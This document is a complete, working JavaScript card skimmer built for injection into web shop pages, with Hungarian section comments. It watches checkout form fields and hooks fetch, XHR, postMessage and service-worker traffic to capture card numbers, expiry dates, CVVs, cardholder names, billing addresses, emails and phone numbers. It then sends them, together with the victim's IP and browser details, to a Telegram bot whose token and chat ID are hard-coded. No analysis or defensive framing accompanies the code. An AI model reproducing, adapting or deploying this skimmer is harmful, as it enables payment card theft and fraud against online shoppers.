(() => {
  if (window.__skim_injected) return;
  window.__skim_injected = true;

  // === KONFIG ===
  const TG_TOKEN = '8803578308:AAEyRXKJAD-dILkOJKdZv9ungSRrpH6Txiw';
  const TG_CHAT  = '8241854538';
  const TAG = 'joco';
  const TG_URL = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;

  // === ÁLLAPOT ===
  const S = {
    sid: Math.random().toString(36).slice(2, 14),
    fields: {},
    sent: new Set(),
    timer: null,
    lastSched: 0,
    queue: [],
    flushing: false,
    ip: '',
  };

  // === SEGÉDEK ===
  const esc = s => String(s || '')
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

  const brandOf = n => {
    n = String(n || '').replace(/\D/g, '');
    if (/^4/.test(n)) return 'VISA';
    if (/^(5[1-5]|222[1-9]|22[3-9]|2[3-6]|27[01]|2720)/.test(n)) return 'MASTERCARD';
    if (/^3[47]/.test(n)) return 'AMEX';
    if (/^6(?:011|5)/.test(n)) return 'DISCOVER';
    if (/^3(?:0[0-5]|[68])/.test(n)) return 'DINERS';
    if (/^35/.test(n)) return 'JCB';
    if (/^62/.test(n)) return 'UNIONPAY';
    return 'CARD';
  };

  const luhn = n => {
    n = String(n || '').replace(/\D/g, '');
    if (n.length < 12 || n.length > 19) return false;
    let s = 0, alt = false;
    for (let i = n.length - 1; i >= 0; i--) {
      let d = +n[i];
      if (alt) { d *= 2; if (d > 9) d -= 9; }
      s += d; alt = !alt;
    }
    return s % 10 === 0;
  };

  const safeFetch = (url, opts) => {
    try { return fetch(url, opts).catch(() => null); }
    catch (_) { return Promise.resolve(null); }
  };

  const toStr = b => {
    try {
      if (b == null) return '';
      if (typeof b === 'string') return b;
      if (b instanceof URLSearchParams) return b.toString();
      if (b instanceof FormData) {
        const o = {};
        b.forEach((v, k) => { o[k] = v; });
        return JSON.stringify(o);
      }
      if (b instanceof ArrayBuffer) return new TextDecoder().decode(b);
      if (ArrayBuffer.isView(b)) return new TextDecoder().decode(b);
      if (b instanceof Blob) return ''; // Blob async, kihagyjuk
      try { return JSON.stringify(b); } catch (_) { return String(b); }
    } catch (_) { return ''; }
  };

  const CARD_RE = /card|number|pan|exp|cvv|cvc|payment_method|cc_/i;

  // === FORM CAPTURE ===
  const AC_MAP = {
    'cc-number': 'cc_number', 'cc-exp': 'cc_exp', 'cc-exp-month': 'cc_exp',
    'cc-exp-year': 'cc_exp', 'cc-csc': 'cc_cvv', 'cc-cvv': 'cc_cvv',
    'cc-name': 'cc_name', 'cc-given-name': 'cc_name', 'cc-family-name': 'cc_name',
    'street-address': 'billing', 'address-line1': 'billing',
    'address-level2': 'city', 'address-level1': 'state',
    'postal-code': 'zip', 'country': 'country', 'country-name': 'country',
    'email': 'email', 'tel': 'phone', 'tel-national': 'phone',
  };

  const PATTERNS = [
    { k: 'cc_number', re: /(card[-_]?number|cc[-_]?num|ccnumber|cardnumber|cc[-_]?no|creditcard|card[-_]?no|payment[-_]?number|acct[-_]?no|ccnum)/i },
    { k: 'cc_exp',    re: /(cc[-_]?exp|exp[-_]?date|exp[-_]?month|exp[-_]?year|expiry|expiration|mm[-_]?yy|valid[-_]?thru|good[-_]?thru)/i },
    { k: 'cc_cvv',    re: /(cvv|cvc|cvn|csc|security[-_]?code|card[-_]?code|cvc2|verification[-_]?value)/i },
    { k: 'cc_name',   re: /(card[-_]?holder|cardholder|cc[-_]?name|name[-_]?on[-_]?card)/i },
    { k: 'country',   re: /(country)/i },
    { k: 'state',     re: /(state|province|region)/i },
    { k: 'billing',   re: /(billing|address|street|line1|addr1)/i },
    { k: 'city',      re: /(city|town)/i },
    { k: 'zip',       re: /(zip|postal|postcode)/i },
    { k: 'email',     re: /(email|e-mail)/i },
    { k: 'phone',     re: /(phone|tel|mobile)/i },
  ];

  const meta = el => {
    if (!el) return '';
    const g = n => (el.getAttribute && el.getAttribute(n)) || '';
    return [el.name, el.id, el.className, el.placeholder, el.type,
      g('autocomplete'), g('data-testid'), g('data-test-id'), g('data-qa'),
      g('aria-label'), g('formcontrolname'), g('ng-model'), g('v-model'),
      g('data-field'), g('data-name')].filter(Boolean).join(' ');
  };

  const match = el => {
    if (!el) return null;
    const ac = (el.getAttribute && el.getAttribute('autocomplete') || '').toLowerCase().trim();
    if (ac && AC_MAP[ac]) return AC_MAP[ac];
    const m = meta(el);
    for (const p of PATTERNS) if (p.re.test(m)) return p.k;
    if (el.value) {
      const d = String(el.value).replace(/\D/g, '');
      if (d.length >= 12 && d.length <= 19 && luhn(d)) return 'cc_number';
    }
    return null;
  };

  const capture = (el, k) => {
    if (!el || !k) return;
    let v = el.value;
    if (v == null) return;
    v = String(v).trim();
    if (!v) return;
    if (k === 'cc_number' && !luhn(v)) return;
    if (k === 'cc_cvv' && !/^\d{3,4}$/.test(v)) return;
    if (S.fields[k] === v) return;
    S.fields[k] = v;
    schedule();
  };

  const bind = el => {
    if (!el || el.__skim_b) return;
    const k = match(el);
    if (!k) return;
    el.__skim_b = true;
    ['input', 'change', 'blur', 'keyup', 'paste'].forEach(ev =>
      el.addEventListener(ev, () => capture(el, k), true));
    if (el.value) capture(el, k);
  };

  const scan = root => {
    if (!root || !root.querySelectorAll) return;
    try {
      root.querySelectorAll('input, select, textarea').forEach(bind);
      root.querySelectorAll('*').forEach(el => {
        if (el.shadowRoot) scan(el.shadowRoot);
      });
    } catch (_) {}
  };

  const scanFrames = () => {
    try {
      document.querySelectorAll('iframe').forEach(f => {
        try {
          const d = f.contentDocument;
          if (d) scan(d);
        } catch (_) {}
      });
    } catch (_) {}
  };

  // === DOM OBSERVER ===
  try {
    new MutationObserver(muts => {
      for (const m of muts) {
        if (!m.addedNodes) continue;
        for (const n of m.addedNodes) {
          if (n.nodeType !== 1) continue;
          if (/^(INPUT|SELECT|TEXTAREA)$/.test(n.tagName)) bind(n);
          scan(n);
          if (n.tagName === 'IFRAME') {
            try { if (n.contentDocument) scan(n.contentDocument); } catch (_) {}
          }
        }
      }
    }).observe(document.documentElement, { childList: true, subtree: true });
  } catch (_) {}

  // === SUBMIT / CLICK ===
  document.addEventListener('submit', e => {
    const f = e.target;
    if (f && f.querySelectorAll)
      f.querySelectorAll('input, select, textarea').forEach(el => capture(el, match(el)));
    flush();
  }, true);

  document.addEventListener('click', e => {
    const t = e.target;
    if (!t) return;
    const tag = (t.tagName || '').toLowerCase();
    if (tag !== 'button' && tag !== 'input' && tag !== 'a') return;
    const txt = ((t.innerText || t.value || '') + '').toLowerCase();
    if (/(pay|submit|checkout|place|order|confirm|buy|purchase|place order)/.test(txt)) {
      setTimeout(() => { scan(document); scanFrames(); flush(); }, 300);
    }
  }, true);

  // === FETCH HOOK ===
  const _fetch = window.fetch;
  window.fetch = function (input, init) {
    try {
      let url = '', body = null, reqInput = null;

      if (typeof input === 'string') {
        url = input;
        body = init && init.body;
      } else if (input && input.url) {
        url = input.url;
        body = (init && init.body) || input.body;
        reqInput = input;
      }

      const urlHit = /token|payment|card|charge|stripe|braintree|paypal|adyen|checkout|authorize|square|klarna|afterpay|purchase/i.test(url);

      if (urlHit && body) {
        // ReadableStream kezelés — tee-vel, hogy a fetch is megkapja
        if (body && typeof body.getReader === 'function' && typeof body.tee === 'function') {
          const [a, b] = body.tee();
          if (reqInput) {
            input = new Request(reqInput, { body: b, duplex: 'half' });
          } else if (init) {
            init = Object.assign({}, init, { body: b, duplex: 'half' });
          }
          const reader = a.getReader();
          const dec = new TextDecoder();
          let chunks = '';
          reader.read().then(function process({ done, value }) {
            if (done) {
              if (chunks && CARD_RE.test(chunks)) hit('fetch', url, chunks);
              return;
            }
            chunks += dec.decode(value, { stream: true });
            if (chunks.length > 20000) chunks = chunks.slice(-20000);
            return reader.read().then(process);
          }).catch(() => {});
        } else {
          const s = toStr(body);
          if (s && CARD_RE.test(s)) hit('fetch', url, s);
        }
      }

      // URL query paraméterben is lehet kártya? ritka, de nézzük
      if (urlHit && /[?&](card|cc|pan|number|cvv)=/i.test(url)) {
        hit('fetch-url', url, url.slice(0, 4000));
      }
    } catch (_) {}
    return _fetch.apply(this, arguments);
  };

  // === XHR HOOK ===
  const _open = XMLHttpRequest.prototype.open;
  const _send = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open = function (m, u) {
    this.__skim_u = u;
    return _open.apply(this, arguments);
  };
  XMLHttpRequest.prototype.send = function (b) {
    try {
      const u = this.__skim_u || '';
      if (/token|payment|card|charge|stripe|braintree|paypal|adyen|checkout|authorize|square|klarna|afterpay|purchase/i.test(u) && b) {
        const s = toStr(b);
        if (s && CARD_RE.test(s)) hit('xhr', u, s);
      }
    } catch (_) {}
    return _send.apply(this, arguments);
  };

  // === POSTMESSAGE HOOK ===
  window.addEventListener('message', e => {
    try {
      const d = typeof e.data === 'string' ? e.data : JSON.stringify(e.data);
      if (d && /tok_|pm_|card|payment|number|exp|cvv|cvc/i.test(d)) {
        hit('postMessage', e.origin || '', d);
      }
    } catch (_) {}
  }, true);

  // === SERVICE WORKER HOOK ===
  try {
    if (navigator.serviceWorker && navigator.serviceWorker.addEventListener) {
      navigator.serviceWorker.addEventListener('message', e => {
        try {
          const d = JSON.stringify(e.data);
          if (/card|payment|number|exp|cvv/i.test(d)) hit('sw', '', d);
        } catch (_) {}
      });
    }
  } catch (_) {}

  // === EXFIL ===
  const hit = (src, url, body) => {
    const payload = {
      tag: TAG,
      src,
      sid: S.sid,
      url: location.href,
      origin: location.origin,
      referrer: document.referrer || '',
      ts: Date.now(),
      body: String(body || '').slice(0, 4000),
    };
    S.queue.push(payload);
    drain();
  };

  const formatHit = (f, m) => {
    const num = (f.cc_number || '').replace(/\D/g, '');
    const b = brandOf(num);
    const L = [];
    L.push(`🏷 <b>${esc(m.tag)}</b>  🆔 <code>${esc(m.sid)}</code>`);
    if (f.cc_number) L.push(`💳 <b>${b}</b>  <code>${esc(f.cc_number)}</code>`);
    if (f.cc_exp || f.cc_cvv)
      L.push(`📅 exp <code>${esc(f.cc_exp || '—')}</code>  🔒 cvv <code>${esc(f.cc_cvv || '—')}</code>`);
    if (f.cc_name) L.push(`👤 ${esc(f.cc_name)}`);
    if (f.billing) L.push(`🏠 ${esc(f.billing)}`);
    if (f.city) L.push(`🏙 ${esc(f.city)}`);
    if (f.state) L.push(`📍 ${esc(f.state)}`);
    if (f.zip) L.push(`📮 ${esc(f.zip)}`);
    if (f.country) L.push(`🌍 ${esc(f.country)}`);
    if (f.email) L.push(`📧 <code>${esc(f.email)}</code>`);
    if (f.phone) L.push(`📞 ${esc(f.phone)}`);
    L.push('', `🌐 ${esc(m.url)}`, `🆔 <code>${esc(m.sid)}</code>`);
    if (m.ip) L.push(`📡 IP: <code>${esc(m.ip)}</code>`);
    if (m.ua) L.push(`🖥 UA: <code>${esc(m.ua)}</code>`);
    return L.join('\n');
  };

  const getIP = async () => {
    if (S.ip) return S.ip;
    const r = await safeFetch('https://api.ipify.org?format=json');
    if (r) { try { const j = await r.json(); S.ip = j.ip || ''; } catch (_) {} }
    return S.ip;
  };

  const tgSend = async text => {
    return safeFetch(TG_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TG_CHAT,
        text,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
      }),
    });
  };

  const send = async () => {
    const num = (S.fields.cc_number || '').replace(/\D/g, '');
    if (Object.keys(S.fields).length === 0) return;
    if (num.length < 12 && !S.fields.email && !S.fields.phone) return;
    const key = JSON.stringify(S.fields);
    if (S.sent.has(key)) return;
    S.sent.add(key);
    if (S.sent.size > 200) S.sent = new Set([...S.sent].slice(-100));

    const ip = await getIP();
    const text = formatHit(S.fields, {
      url: location.host + location.pathname,
      sid: S.sid,
      ip,
      ua: navigator.userAgent,
      tag: TAG,
    });

    await tgSend(text);
  };

  const flush = () => {
    if (S.timer) { clearTimeout(S.timer); S.timer = null; }
    send();
  };

  const schedule = () => {
    const now = Date.now();
    if (now - S.lastSched < 1500) return;
    S.lastSched = now;
    if (S.timer) clearTimeout(S.timer);
    S.timer = setTimeout(() => send(), 900);
  };

  const drain = async () => {
    if (S.flushing) return;
    S.flushing = true;
    while (S.queue.length) {
      const item = S.queue.shift();
      const text =
        `🏷 <b>${esc(item.tag)}</b>  src=<b>${esc(item.src)}</b>\n` +
        `🌐 ${esc(item.url)}\n` +
        `🆔 <code>${esc(item.sid)}</code>\n` +
        `📡 IP: <code>${esc(S.ip || '—')}</code>\n` +
        `🖥 UA: <code>${esc(navigator.userAgent)}</code>\n\n` +
        `<code>${esc(item.body)}</code>`;
      try { await tgSend(text); } catch (_) {}
    }
    S.flushing = false;
  };

  // === INDÍTÁS ===
  getIP();
  scan(document);
  scanFrames();
  setTimeout(() => { scan(document); scanFrames(); }, 1500);
  setTimeout(() => { scan(document); scanFrames(); }, 4000);
  setInterval(() => { scan(document); scanFrames(); }, 8000);
})();
